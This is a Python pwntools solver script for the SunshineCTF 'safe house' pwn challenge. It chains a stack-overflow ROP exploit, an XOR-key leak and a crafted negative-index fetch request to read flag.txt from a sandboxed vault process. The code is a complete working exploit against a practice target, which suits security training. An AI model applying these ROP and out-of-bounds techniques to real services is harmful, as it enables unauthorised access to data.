#!/usr/bin/env python3
# SunshineCTF "safe house" (service) - pwn
# front-desk SUBMIT stack overflow (no canary/PIE) -> ROP.
# both front-desk & seccomp'd vault share an XOR key (set before fork) at 0x405060.
# leak key, then hand-craft an encrypted RELAY op=3 (fetch) request with a NEGATIVE
# index (-4): notes-table@0x4060b0 minus 4*0x40c == system-table[0]@0x405080 == flag.txt
# (type 2 -> pread). Send it raw to the vault over fd3, then RELAY reads+decrypts+prints.
import sys, os, stat, time
from pwn import *
context.arch = 'amd64'; context.log_level = 'info'

def local_io():
    # make ./service executable if it isn't already
    try:
        os.chmod('./service', os.stat('./service').st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    except OSError as e:
        log.warning('chmod ./service failed: %s' % e)
    return process('./service')

pop_rdi = 0x401529            # pop rdi ; ret
pop_rsi = 0x401dd5            # pop rsi ; ret
strlen  = 0x4011b0           # strlen@plt
read_p  = 0x4011f0           # read@plt
w_rdxr  = 0x401c32           # mov rdx, rax ; jmp write@plt
resume  = 0x4014d0           # command prompt loop
KEY     = 0x405060
BSS     = 0x406800
DUMMY   = 0x406900
PAD     = 0x48

def rop(*qs): return b'A'*PAD + b''.join(p64(x) for x in qs)
def submit(io, p):
    io.sendline(b'SUBMIT %d' % len(p)); io.recvuntil(b'GO'); io.recv(1); io.send(p)
def enc(plain, kb):
    ks = [kb[3], kb[2], kb[1], kb[0]]
    return bytes(plain[i] ^ ks[i % 4] for i in range(len(plain)))

def pwn(io):
    io.recvuntil(b'sh> ')
    # 1) leak 4-byte XOR key: write(1, KEY, strlen("PING")==4)
    submit(io, rop(pop_rdi, 0x4030bf, strlen, pop_rdi, 1, pop_rsi, KEY, w_rdxr, resume))
    kb = io.recvuntil(b'sh> ').split(b'OK\n', 1)[1][:4]
    log.success('xor key = %s' % kb.hex())
    # 2) craft encrypted op3 fetch, index = -4 -> flag.txt entry
    req = enc([3, 0, 4, 0], kb) + enc([0xfc, 0xff, 0xff, 0xff], kb)   # header + payload
    if b'\x00' in req:               # NUL would shorten strlen count; retry w/ fresh key
        log.warning('NUL in ciphertext for this key, will reconnect'); return None
    # 3) stage req in bss then write(3, BSS, 8):
    #    read#1(3 dummy) bumps rdx large; read#2 slurps 8 bytes -> rax=8; write(3,BSS,rax)
    # read@plt keeps rdx==3, so 3 reads of 3 bytes consume all 8 req bytes (3+3+2)
    submit(io, rop(pop_rdi, 0,                            # rdi=0 persists across read
                   pop_rsi, BSS,   read_p,
                   pop_rsi, BSS+3, read_p,
                   pop_rsi, BSS+6, read_p,               # 3 reads consume all 8 bytes
                   pop_rdi, BSS, strlen,                 # rax = strlen(BSS) == 8
                   pop_rdi, 3, pop_rsi, BSS, w_rdxr,     # write(3, BSS, 8)
                   resume))
    time.sleep(0.2); io.send(req)                        # 8 ciphertext bytes
    io.recvuntil(b'sh> ')
    time.sleep(0.2)
    # 4) RELAY reads the queued vault reply from fd3, decrypts w/ key, prints flag
    io.sendline(b'RELAY 1'); time.sleep(0.3)
    data = io.recvrepeat(0.6)
    log.info('reply: %r' % data)
    return data

if __name__ == '__main__':
    d = None
    for attempt in range(20):
        io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else local_io()
        try:
            d = pwn(io)
        except EOFError:
            d = None
        if d and (b'{' in d):
            break
        io.close()
    if d:
        for t in (b'SUN{', b'sun{', b'flag{', b'CTF{'):
            i = d.find(t)
            if i >= 0:
                log.success('FLAG: ' + d[i:d.find(b'}', i)+1].decode('latin1')); break
